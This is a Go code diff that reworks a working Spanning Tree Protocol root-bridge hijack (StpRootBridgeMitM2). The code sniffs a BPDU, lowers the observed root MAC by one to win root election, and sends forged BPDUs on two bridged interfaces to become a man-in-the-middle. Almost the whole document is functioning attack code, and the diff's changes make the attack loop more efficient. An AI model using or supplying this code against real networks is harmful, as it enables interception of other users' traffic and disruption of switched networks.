@@ -19,43 +19,45 @@ func StpRootBridgeMitM2(iface1, iface2 string) {
 		log.Fatal(err)
 	}
 	go sniffer.Bridge_and_Sniff(iface1, iface2)
+
+	pkt, err := ss.Recv()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	stpLayer := utils.GetSTPLayer(pkt)
+	if stpLayer != nil {
+		fmt.Println("Received an STP packet")
+	}
+
+	rootString := stpLayer.RouteID.HwAddr.String()
+	rootStringAux := strings.ReplaceAll(rootString, ":", "")
+	rootInt, err := strconv.ParseInt(rootStringAux, 16, 64)
+	if err != nil {
+		log.Fatal(err)
+	}
+	rootInt -= 1
+
+	rootMacHex := fmt.Sprintf("%012x", rootInt)
+	parts := make([]string, 0, 6)
+	for i := 0; i < len(rootMacHex); i += 2 {
+		parts = append(parts, rootMacHex[i:i+2])
+	}
+	rootMac := strings.Join(parts, ":")
+
+	params := map[string]interface{}{
+		"rootmac":   rootMac,
+		"bridgemac": rootMac,
+		"rootid":    stpLayer.RouteID.SysID,
+		"bridgeid":  stpLayer.RouteID.SysID,
+	}
+
 	for {
-		pkt, err := ss.Recv()
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		stpLayer := utils.GetSTPLayer(pkt)
-		if stpLayer != nil {
-			fmt.Println("Received an STP packet")
-		}
-
-		rootString := stpLayer.RouteID.HwAddr.String()
-		rootStringAux := strings.ReplaceAll(rootString, ":", "")
-		rootInt, err := strconv.ParseInt(rootStringAux, 16, 64)
-		if err != nil {
-			log.Fatal(err)
-		}
-		rootInt -= 1
-
-		rootMacHex := fmt.Sprintf("%012x", rootInt)
-		parts := make([]string, 0, 6)
-		for i := 0; i < len(rootMacHex); i += 2 {
-			parts = append(parts, rootMacHex[i:i+2])
-		}
-		rootMac := strings.Join(parts, ":")
-
-		params := map[string]interface{}{
-			"rootmac":   rootMac,
-			"bridgemac": rootMac,
-			"rootid":    stpLayer.RouteID.SysID,
-			"bridgeid":  stpLayer.RouteID.SysID,
-		}
-
 		stpRootBridgeHijacktwo(iface1, params)
 		stpRootBridgeHijacktwo(iface2, params)
-		time.Sleep(10 * time.Second)
+		time.Sleep(20 * time.Second)
 	}
+
 }
 
 func stpRootBridgeHijacktwo(iface string, params map[string]interface{}) {
@@ -97,7 +99,7 @@ func stpRootBridgeHijacktwo(iface string, params map[string]interface{}) {
 		// Parse the packet
 		stpResponse := utils.GetSTPLayer(pkt)
 
-		if stpResponse != nil {
+		if stpResponse != nil && stpResponse.BridgeID.HwAddr.String() != rootMAC {
 			Dot3Layer := packet.Dot3Layer()
 			Dot3Layer.SetDstMAC("01:80:c2:00:00:00")
 			Dot3Layer.SetSrcMAC(bridgeMAC)
